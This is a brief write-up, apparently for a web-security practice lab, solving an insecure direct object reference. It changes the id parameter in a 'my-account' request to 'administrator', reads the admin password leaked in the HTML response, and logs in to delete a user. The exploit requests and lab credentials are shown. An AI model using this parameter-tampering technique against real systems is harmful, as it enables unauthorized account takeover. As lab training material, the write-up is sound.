### Lab 8 User ID controlled by request parameter with password disclosure (Apprentice)

**Mission Description**  
The lab leaks the current user's password in a masked input field on the account page.  

**Mission Objective**  
Retrieve the administrator's password, log in as admin, and delete the user `carlos`.  

**Steps**  
- Log in with `wiener:peter`.  
- Open Burp and intercept the request:  

GET /my-account?id=wiener

- Change `id=wiener` to `id=administrator`:  

GET /my-account?id=administrator

- The response includes the administrator’s details and a **prefilled hidden password field**:  
```html
<input required type=password name=password value='au4t1huan8gt29fmfiqg'/>

    Copy the password (au4t1huan8gt29fmfiqg) and log in as administrator.

    Go to the admin panel and delete the user carlos.

Final Payload

GET /my-account?id=administrator

Notes

    The password is exposed in plaintext inside the HTML response due to insecure implementation.

    This is both IDOR and Sensitive Data Exposure in one shot.

Status: Solved ✅
